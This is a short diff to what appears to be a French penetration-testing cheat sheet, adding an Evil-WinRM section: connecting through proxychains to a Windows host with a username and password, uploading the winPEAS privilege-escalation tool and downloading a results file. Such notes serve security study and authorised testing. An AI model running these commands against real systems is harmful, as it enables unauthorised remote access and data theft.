@@ -32,6 +32,13 @@ https://github.com/swisskyrepo/PayloadsAllTheThings
     ...
     scp ./fichier_local timothe@192.168.50.100:/home/dossier
     scp timothe@192.168.50.100:/home/dossier/fichier_distant ./
+    
+**Evil-WinRM**
+
+    sudo proxychains evil-winrm -u Tim -p 'Mdp123' -i 10.10.100.100
+    upload /var/www/html/winpeas.exe
+    ...
+    download resultat.txt
 
 **WebDAV**
 
